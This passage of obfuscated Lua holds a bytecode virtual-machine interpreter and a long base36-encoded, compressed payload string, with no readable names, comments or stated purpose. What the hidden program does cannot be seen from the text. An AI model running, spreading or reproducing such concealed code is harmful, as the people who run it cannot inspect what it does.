e[1][e[2]];end,__newindex=function(n,e,l)local e=t[e]e[1][e[2]]=l;end;});for c=1,e[4]do l=l+1;local e=o[l];if e[1]==42 then t[c-1]={n,e[3]};else t[c-1]={i,e[3]};end;s[#s+1]=t;end;n[e[2]]=h(a,d,c);elseif t==15 then local e=e[2]n[e]=n[e](a(n,e+1,d))else local t;n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=n[e[3]][n[e[4]]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;end;elseif t<=18 then if t==17 then local t;n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=n[e[3]][n[e[4]]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]==n[e[4]])then l=l+1;else l=e[3];end;else n[e[2]]=(e[3]~=0);l=l+1;end;elseif t>19 then local o=e[2]local t={n[o](a(n,o+1,e[3]))};local l=0;for e=o,e[4]do l=l+1;n[e]=t[l];end else n[e[2]]=n[e[3]][e[4]];end;elseif t<=24 then if t<=22 then if t>21 then local e=e[2]n[e](a(n,e+1,d))else if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;end;elseif t>23 then local i;local f;local h,s;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t]()l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]h,s=B(n[t](a(n,t+1,e[3])))d=s+t-1 f=0;for e=t,d do f=f+1;n[e]=h[f];end;l=l+1;e=o[l];t=e[2]n[t]=n[t](a(n,t+1,d))l=l+1;e=o[l];t=e[2];d=t+G-1;for e=t,d do i=P[e-t];n[e]=i;end;l=l+1;e=o[l];t=e[2];do return n[t](a(n,t+1,d))end;l=l+1;e=o[l];t=e[2];do return a(n,t,d)end;l=l+1;e=o[l];do return end;else n[e[2]]=n[e[3]][n[e[4]]];end;elseif t<=26 then if t==25 then local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t]()l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](a(n,t+1,e[3]))l=l+1;e=o[l];n[e[2]][e[3]]=n[e[4]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t]()l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](a(n,t+1,e[3]))l=l+1;e=o[l];n[e[2]][e[3]]=n[e[4]];else n[e[2]]={};end;elseif t==27 then n[e[2]]=h(C[e[3]],nil,c);else n[e[2]][e[3]]=n[e[4]];end;elseif t<=42 then if t<=35 then if t<=31 then if t<=29 then c[e[3]]=n[e[2]];elseif t==30 then local l=e[2];do return n[l](a(n,l+1,e[3]))end;else local e=e[2]n[e]=n[e](n[e+1])end;elseif t<=33 then if t>32 then local e=e[2];do return n[e](a(n,e+1,d))end;else if n[e[2]]then l=l+1;else l=e[3];end;end;elseif t>34 then local e=e[2]n[e]=n[e](n[e+1])else n[e[2]][e[3]]=n[e[4]];end;elseif t<=38 then if t<=36 then local f;local i,h;local t;n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]i,h=B(n[t](n[t+1]))d=h+t-1 f=0;for e=t,d do f=f+1;n[e]=i[f];end;l=l+1;e=o[l];t=e[2]n[t]=n[t](a(n,t+1,d))elseif t>37 then local l=e[2]local o,e=B(n[l](a(n,l+1,e[3])))d=e+l-1 local e=0;for l=l,d do e=e+1;n[l]=o[e];end;else local e=e[2]n[e]=n[e]()end;elseif t<=40 then if t>39 then local f;local i,h;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]];l=l+1;e=o[l];t=e[2]i,h=B(n[t](n[t+1]))d=h+t-1 f=0;for e=t,d do f=f+1;n[e]=i[f];end;l=l+1;e=o[l];t=e[2]i,h=B(n[t](a(n,t+1,d)))d=h+t-1 f=0;for e=t,d do f=f+1;n[e]=i[f];end;l=l+1;e=o[l];t=e[2]n[t](a(n,t+1,d))l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]();else local l=e[2]n[l]=n[l](a(n,l+1,e[3]))end;elseif t==41 then local t;local d;local a;n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=n[e[3]];l=l+1;e=o[l];a=e[3];d=n[a]for e=a+1,e[4]do d=d..n[e];end;n[e[2]]=d;l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;else n[e[2]]=n[e[3]];end;elseif t<=49 then if t<=45 then if t<=43 then l=e[3];elseif t==44 then n[e[2]]=i[e[3]];else local o=e[2];local c=n[o+2];local t=n[o]+c;n[o]=t;if(c>0)then if(t<=n[o+1])then l=e[3];n[o+3]=t;end elseif(t>=n[o+1])then l=e[3];n[o+3]=t;end end;elseif t<=47 then if t>46 then local l=e[2]n[l]=n[l](a(n,l+1,e[3]))else do return n[e[2]]end end;elseif t>48 then local l=e[2]local t={n[l](n[l+1])};local o=0;for e=l,e[4]do o=o+1;n[e]=t[o];end else if(n[e[2]]~=e[4])then l=l+1;else l=e[3];end;end;elseif t<=53 then if t<=51 then if t>50 then local l=e[2]local t={n[l](n[l+1])};local o=0;for e=l,e[4]do o=o+1;n[e]=t[o];end else local l=e[2];local o=n[e[3]];n[l+1]=o;n[l]=o[e[4]];end;elseif t==52 then n[e[2]]=e[3];else n[e[2]][n[e[3]]]=n[e[4]];end;elseif t<=55 then if t>54 then local l=e[2];do return n[l](a(n,l+1,e[3]))end;else local a=C[e[3]];local d;local t={};d=r({},{__index=function(l,e)local e=t[e];return e[1][e[2]];end,__newindex=function(n,e,l)local e=t[e]e[1][e[2]]=l;end;});for c=1,e[4]do l=l+1;local e=o[l];if e[1]==42 then t[c-1]={n,e[3]};else t[c-1]={i,e[3]};end;s[#s+1]=t;end;n[e[2]]=h(a,d,c);end;elseif t==56 then local o=e[2];local c=n[o+2];local t=n[o]+c;n[o]=t;if(c>0)then if(t<=n[o+1])then l=e[3];n[o+3]=t;end elseif(t>=n[o+1])then l=e[3];n[o+3]=t;end else do return end;end;elseif t<=86 then if t<=71 then if t<=64 then if t<=60 then if t<=58 then local t;c[e[3]]=n[e[2]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];do return end;elseif t>59 then local e=e[2]n[e]=n[e]()else local f;local i,h;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]i,h=B(n[t](n[t+1]))d=h+t-1 f=0;for e=t,d do f=f+1;n[e]=i[f];end;l=l+1;e=o[l];t=e[2]n[t]=n[t](a(n,t+1,d))end;elseif t<=62 then if t==61 then local o=e[2];local l=n[e[3]];n[o+1]=l;n[o]=l[e[4]];else n[e[2]]=(e[3]~=0);l=l+1;end;elseif t>63 then local t;n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]();l=l+1;e=o[l];l=e[3];else local e=e[2]n[e](n[e+1])end;elseif t<=67 then if t<=65 then local o=e[3];local l=n[o]for e=o+1,e[4]do l=l..n[e];end;n[e[2]]=l;elseif t==66 then n[e[2]]=(e[3]~=0);else local e=e[2];do return a(n,e,d)end;end;elseif t<=69 then if t==68 then local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]==n[e[4]])then l=l+1;else l=e[3];end;else local l=e[2]local o,e=B(n[l]())d=e+l-1 local e=0;for l=l,d do e=e+1;n[l]=o[e];end;end;elseif t==70 then local t=e[2];local c=e[4];local o=t+2 local t={n[t](n[t+1],n[o])};for e=1,c do n[o+e]=t[e];end;local t=t[1]if t then n[o]=t l=e[3];else l=l+1;end;else if(n[e[2]]==n[e[4]])then l=l+1;else l=e[3];end;end;elseif t<=78 then if t<=74 then if t<=72 then local o=e[2];local c=e[4];local t=o+2 local o={n[o](n[o+1],n[t])};for e=1,c do n[t+e]=o[e];end;local o=o[1]if o then n[t]=o l=e[3];else l=l+1;end;elseif t==73 then local f;local s,h;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=i[e[3]];l=l+1;e=o[l];t=e[2]s,h=B(n[t]())d=h+t-1 f=0;for e=t,d do f=f+1;n[e]=s[f];end;l=l+1;e=o[l];t=e[2]n[t](a(n,t+1,d))l=l+1;e=o[l];l=e[3];else local o=e[3];local l=n[o]for e=o+1,e[4]do l=l..n[e];end;n[e[2]]=l;end;elseif t<=76 then if t>75 then local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;else local l=e[2]local o,e=B(n[l](a(n,l+1,e[3])))d=e+l-1 local e=0;for l=l,d do e=e+1;n[l]=o[e];end;end;elseif t>77 then n[e[2]]=i[e[3]];else n[e[2]]=(e[3]~=0);end;elseif t<=82 then if t<=80 then if t>79 then local f;local h,i;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]h,i=B(n[t](a(n,t+1,e[3])))d=i+t-1 f=0;for e=t,d do f=f+1;n[e]=h[f];end;l=l+1;e=o[l];t=e[2];do return n[t](a(n,t+1,d))end;l=l+1;e=o[l];t=e[2];do return a(n,t,d)end;l=l+1;e=o[l];do return end;else c[e[3]]=n[e[2]];end;elseif t==81 then n[e[2]]=e[3];else local e=e[2];d=e+G-1;for l=e,d do local e=P[l-e];n[l]=e;end;end;elseif t<=84 then if t==83 then local e=e[2];do return a(n,e,d)end;else local e=e[2]local o,l=B(n[e]())d=l+e-1 local l=0;for e=e,d do l=l+1;n[e]=o[l];end;end;elseif t>85 then do return end;else local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]==n[e[4]])then l=l+1;else l=e[3];end;end;elseif t<=101 then if t<=93 then if t<=89 then if t<=87 then n[e[2]]=h(C[e[3]],nil,c);elseif t==88 then l=e[3];else local f;local h,s;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=i[e[3]];l=l+1;e=o[l];t=e[2]h,s=B(n[t]())d=s+t-1 f=0;for e=t,d do f=f+1;n[e]=h[f];end;l=l+1;e=o[l];t=e[2]n[t](a(n,t+1,d))l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];l=e[3];end;elseif t<=91 then if t>90 then n[e[2]]=n[e[3]][n[e[4]]];else local e=e[2]n[e]=n[e](a(n,e+1,d))end;elseif t>92 then local o=e[2];local t=n[o]local c=n[o+2];if(c>0)then if(t>n[o+1])then l=e[3];else n[o+3]=t;end elseif(t<n[o+1])then l=e[3];else n[o+3]=t;end else local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;end;elseif t<=97 then if t<=95 then if t==94 then local l=e[2]local t={n[l](a(n,l+1,e[3]))};local o=0;for e=l,e[4]do o=o+1;n[e]=t[o];end else if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;end;elseif t==96 then local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;else local e=e[2]local o,l=B(n[e](n[e+1]))d=l+e-1 local l=0;for e=e,d do l=l+1;n[e]=o[l];end;end;elseif t<=99 then if t>98 then local f;local h,s;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=i[e[3]];l=l+1;e=o[l];t=e[2]h,s=B(n[t]())d=s+t-1 f=0;for e=t,d do f=f+1;n[e]=h[f];end;l=l+1;e=o[l];t=e[2]n[t](a(n,t+1,d))else n[e[2]]=c[e[3]];end;elseif t>100 then local e=e[2];do return n[e](a(n,e+1,d))end;else n[e[2]]=n[e[3]][e[4]];end;elseif t<=108 then if t<=104 then if t<=102 then local e=e[2]local o,l=B(n[e](n[e+1]))d=l+e-1 local l=0;for e=e,d do l=l+1;n[e]=o[l];end;elseif t>103 then local t;n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]();l=l+1;e=o[l];l=e[3];else if not n[e[2]]then l=l+1;else l=e[3];end;end;elseif t<=106 then if t>105 then n[e[2]]={};else local e=e[2]n[e](n[e+1])end;elseif t==107 then local t;local a;local d;c[e[3]]=n[e[2]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];d=e[2]a={n[d](n[d+1])};t=0;for e=d,e[4]do t=t+1;n[e]=a[t];end l=l+1;e=o[l];l=e[3];else local o=e[2];local t=n[o]local c=n[o+2];if(c>0)then if(t>n[o+1])then l=e[3];else n[o+3]=t;end elseif(t<n[o+1])then l=e[3];else n[o+3]=t;end end;elseif t<=112 then if t<=110 then if t>109 then if not n[e[2]]then l=l+1;else l=e[3];end;else if(n[e[2]]==e[4])then l=l+1;else l=e[3];end;end;elseif t==111 then local a;local d;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2];d=n[t]a=n[t+2];if(a>0)then if(d>n[t+1])then l=e[3];else n[t+3]=d;end elseif(d<n[t+1])then l=e[3];else n[t+3]=d;end else local e=e[2]n[e](a(n,e+1,d))end;elseif t<=114 then if t==113 then local f;local h,i;local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]h,i=B(n[t](n[t+1]))d=i+t-1 f=0;for e=t,d do f=f+1;n[e]=h[f];end;l=l+1;e=o[l];t=e[2]n[t]=n[t](a(n,t+1,d))else n[e[2]]();end;elseif t==115 then do return n[e[2]]end else n[e[2]]=n[e[3]];end;l=l+1;end;end;end;return h(I(),{},L())();
  end)
else
  local d=string.byte;local i=string.char;local t=string.sub;local P=table.concat;local e=table.insert;local C=math.ldexp;local L=getfenv or function()return _ENV end;local r=setmetatable;local s=select;local a=unpack or table.unpack;local B=tonumber;local function h(a)local l,n,d="","",{}local c=256;local o={}for e=0,c-1 do o[e]=i(e)end;local e=1;local function f()local l=B(t(a,e,e),36)e=e+1;local n=B(t(a,e,e+l-1),36)e=e+l;return n end;l=i(f())d[1]=l;while e<#a do local e=f()if o[e]then n=o[e]else n=l..t(l,1,1)end;o[c]=l..t(n,1,1)d[#d+1],l,c=n,n,c+1 end;return table.concat(d)end;local f=h('24124627524724F27524626X26Y26Q25L26E26C27326W26A24724327927F27H27J24A27925L25L25Z26B26A27226X27G26K26R26Q24724027R25L26726W27327J27L27527S25G26R26D24727427525X28927328026W24727Q28J26C26R26V26A26R25E27228S26V26Q24627827524E27927727927B27D27N27I28327926D26A27G26W26P29D27526O27Y26Z28U29K24625P24Z26D25N24S25224723P27925T26R26A28E26D26X26B26C26T26R2632A229028U26V24723K2A02A225X2A728S27I2A42A62A826R26026V26Z26R24724527926Z26X26Q2AX2792B32B424927923O23Y2462472BA2B72752442462BF2752522BE2BG2462AX23O2752AX2422BD2462BR28B2462BO24627L2842B427L2BB2BF2BX28428I2BW2752742952B42BR2C72792BH2BL2792B22B42BC2CK2CL2CM2CN24C2962C727S26T28S26Q28G2BV26E26V27326C28G24D27925X2CV26R27I27326V26Y28G2CJ2632B029Y2AI2A328F2AP2A92AB26A2AD2DO2AG2DI2AK26C2AM2DJ2A52A72A92AS2AU2AW2AY2B02CJ2B428H27925C26R2D227326X28O2C72682EA26D2EC26W2B42BJ27523O2C02CN2402EK27523V2BC2BB24225Q2792EU2BB2462702CM23O2712962BS2BK2EN2762BM2CO2BF2BF2BR2792D42BB2EO2BY2CN2462CQ27L2BQ24624025S2792782C32BT2EY2752FV2BW2EP2F12BW23Z2BC2BV2BX2BF2EP2CF2BC2C42BP2462C72BX2BR2CB2B32EW2BL23Q2B32BR2FJ2GK2BS2BB2G72BK2GA2BK2FW2BX2AX2CQ2FA2BT2462GJ2F72BR2BF2GN2FU2BC2FK2FB29E2GB27924V2F72752D42762FG24629O27W29Q26C26V26W26Q26X26Z2E52F223225Y2HX24622U24P2I125R25Y2472HM26Y26X2902472H924627S26Z26N25L28V29F25L26826V26C25224R29X2HM26A26N26E2AV2BV28D28F2I12522I724B2852IH2IJ28F26A2IM2IO2B42562B726X2HI2462EM2B32GD2BC2I12BK2JK2GL2H22BF2G32EM2FE2BL2GZ2FL2B42JU2JK2FQ2752FG2BB25B2HB2842BZ2B72K52C62CK2CE2B32842KB27927L2JU2C52H42KC2JX2KE2BL2JK2742932C82KL2H12B32742JU2C02842G52BB2742EX2792L12FX27924W2CL26A2FR2KN2BL2842BB2FJ2KF2462HK2FR2EK28423T2EV2L72752LO2EW2FY2462512K62LC2LK2KZ2LV2CN2L42752LW2LT27925A2CL25W2LC2B426D2LC2CG2M32462M82F12MA2GW2462MD2842MF2572BC2FI2752MA2LG2B32MD2FW2HG2JG23R2962IT2IV2IX27M26T2DB26Y2I82792IA2IC2BV26Q26R26S26B29J2C726P2A227H29M27K2852A42J12I02CK23U2NT2B42502I72CG2EC2NP27526927G28V2O224629B28A2792EA26C27Y2472BX24625I2EA29M26C26Z26626A26A26E28E26F26B2J82I123M2NW2B323Y25Y2CM2392B72G22792ER2P52LP2MG2LF2MT2JG2MM2HF2LQ2462382LX2F92FR2JI2CQ2G32MG2PM2PF2J42MJ2PC2MD2PJ2MG2PH2LH2CI2P52JI2N12PN2LU2Q22PF23M2M92PT2PE2PW2PI2H32BI2912B32BZ2ES2462L62M62752L62MG2502QC2G323O2G02HM2EM2MV2BV2GB2JO2MB2KT2BF2KD2GC2LE2B324Z2P82LU2R72PS2HD2752PU2CH2PF2PX2G12792QU2IE27527L2BX2MV2CM2KJ2FB2EP2G82KL2E62KP2CO2GQ2BC2RT2BK2KS2F72KY2B324J2R82792S72RB2FM2RE2MF2LU2RH2HC2FC2752P62752HH2MV2MG2SM2PF25Z2QQ2B725M2JL2FD2JV2RS2BS2R22CK2FW2G92B325U2S82752T52SB2G32PD2PV2SF2QC2KV2522QF2FH2LL2792672T62462TL2QL24625G2SS2EN2G02TF2FB2BB2LK2QY2KT2BB2S12BL2R32T22R024625F2TM2U82T92MW2QA2TD2PY27528Q2TJ27525R2TM2UK2TP26S2TS2BW2T82462UH2JY2SX2S02SZ2GF2T12RX2GA2UO2SN2LU2V22PF26R2Q82RC2TB2RF2QB2UF2462J42SJ2JI26E2M22LU2VI2VD2QR2SU2BB2VF2CK2RR2UW2JQ2UY2RW2S52HE2V32VY2PB2V92SD2RJ2UE2RI2PJ2SK2462692TM2WA2TP1M2UP23O2UR2CG2UU2QZ2U22T02VW2R52792WE2VZ2752WQ2PF1L2V82SC2UD2792SG2EP2CJ2FK2BB2UH2GA1U2TM2X72TP152QC2X22PA2TF2912MV2D42GA1O2TM2XK2XA2XC2P32BC2VQ24025L2792XB2WR2462XV2PF102WW2TA2W32K22W52SH2QU2TA2FL2RO2SI2VR2UV2U12UX2H52FB2JU2CM2RZ2YE2VU2S32YH2WO27521E2TM2YR2TP21D2Y12UC2TC2WZ2QC2Y72C12U02RF2WJ2Z32WL2RV2GR2YI2UZ2YA2Z72YN2R42T32791Z2TM2ZI2TP21A2YW2HE2YY2752X02792482P52QI2162TM2ZW2TP22A2WF2VO2462ZT2RQ2YD2R02RU2U42V02B32292TM310C2UB2ZO2VB2Y52EP2Z12QG2Z331042YC2WK2UX2B62WN2WI2GR2ZC2UX2RL2YO2ZG27521V2TM31112TP2262ZN2RD2WY2ZQ2CL2602CO24Q2S424624W24M2792232BC2N12MG311J2TP23A31162VA2SE2YZ2SB2MC2PE2462HH2RC2UH2O72O9247310N25S26B26T27125226N2A625625226P26B26N2542OF2792OI26C2OK2OM2OO2OQ26R2OS2J829Q29F29H29J2EP312M29P2BV29T25529T2O72IZ26D2I12I32I124Y2OX27923Q2I72B32JM2P0310T2YJ2B3311Y2CN2OG244312129H27J2LW27525V2DU27Y25226T2ED26W26R26T26A27H26P25425228E29G26N314425226D27X26C26A26Y312G2NA27525D2D026A2HX1U2112I72EP27S2872892I12732I72CY2N726Y2N92I92IB2822N32IW2472GJ26O26B26W31422EJ2472LK27U27W27Y28M281312H2UH27S315H314E315K282310R2TN26W2IN26Y27326Q314C2CU27326E26A312H2EP312U314429Q312Y27J2M8313T313V2IP313Y26W3140315D29I25225A29T25B3146314826C314A316K314D27Y314G314I2GJ26A26X316729I2E52SR275311G2PZ2XW2AX2TP2ZT2BB24W2PR31032TM317B2RI2AX2CG23O2722H32I1317J2HB2GE2HM2GH2LD2GE2JR2KT2AX2ML31792BC2HM2462P0317C2VQ2592BC2L32LU31872PY2AX2GJ2FK2BR2S32LB2C22B32Q72AX27L2BR2402BJ2AX24X2VJ279318S2U12EK2BR2QK2PF2QN2LU318V2RI27L2KV2462LB28431822LW2KI2BL317D2FL31932D42MG31932FK319C2EN2P02842UT2RM2BL2RZ27L2YG2LC3182319Q317W2BX27L2VQ2KH2P82B3318431942RF23O24I2LC310N2462732FL317W2MG31A52P62BB2542TM31AK2TP24K2LX317P2792LB2GP2B331AD317P2TP31A52FK31AQ2BW2M82BR315T2EM2BR2BR2GN319Z2462N12H22842OG2792R32SJ2VV2GO2CO2CJ2RZ2K12KT2BU2CK31AW317X2U62GE2RP313L2G3311H279311B2CM311D2YO2W8318J2TP318J2MG23U2WF24Y2R431052RZ2GE2H22JP2JH2TW2Y92GV2BS2AX2GG2K22Z82PZ2VS2CD2BS27L2ZE31BP2RW2JN23X2Z42BW2TL31CN2BS2BR3196317V2UV2BR2TY319Q2Y82FL31DD2GR31822552XO2EN24T31812792QV2G62R131072GE31CO2H3319U317P2JK31CT2H227L319P2H32QX2RC2FE31D0317W2EN26T2FC31DT31D631BQ2RX317T31DB31DE2CK318J2CO2CL31BW2TI2762OG312K312M2ON2OP2OR2OT29F312T29G3168312X29N312Z279313131332IY25L2NR2CK31382CK24E313B275313D2TA314J246314L314V31A426924T2SR31DF31CY2SL2JG2B92EN2P431DK31CC31CI2LP2BN2BK317S2GE2GU2H3317Z31EE31CP31G427L2R331CX2GR31CZ31D123O2UK318M31D531CQ31D831DX29231EI2CO31EJ2RY2KT2752KV2YA31EG2GX2QD31GD31EM31EK31CF27531C02YC31CJ311X2PC31BK2B331H42UU31H631H02462AH31H22792I324731A927524G24U24H24I31HP24H24M24H24L24L25Z24K25S31HY24G25U24G25S24G24I24G24V31HP24K25V31I524G24J24H24G31HY24H31IF24J31IG31HN31I331IN25W31HU313G2472KV31HU31ID24H24K31IF31ID2I131FC312I31HM24U31ID24G24N31IW31HP31IL31IK31J724I2I131FF2GJ24J24M24I25S24J24L24J31JD2CK2OW31J224631IU31J425S31J824I24J31JV24L31IW24G24L2I12OZ24726627931K231I731J931I825Z31J525V31HW31IH24L31K231K131I831HT31I624V24G31IB31IW31I425X24H31JB31KH31K931J431IK31HQ31IK25X31IV24K31IA24G31KT31JB2I12NV315827931II31IM31JC2NS2ID31K824G31KU31KP31KJ31KN31IN25V2I12NY2472CG24I31K32CK313A28P31LC31I624N31I131HS31L331FH26P26D26B26S31LS279254312H2PN296316631EY29I31FH26T2722IO31LB275316Z26W26B26Z26S2EA2I124M313E2HA2EN25I2LP2BI31CJ2JK2BF317O2B4317T319W2BL31N931FP31FP2RC2P031752VQ31C52PF318J31A831FX31AI24624S2TM31NP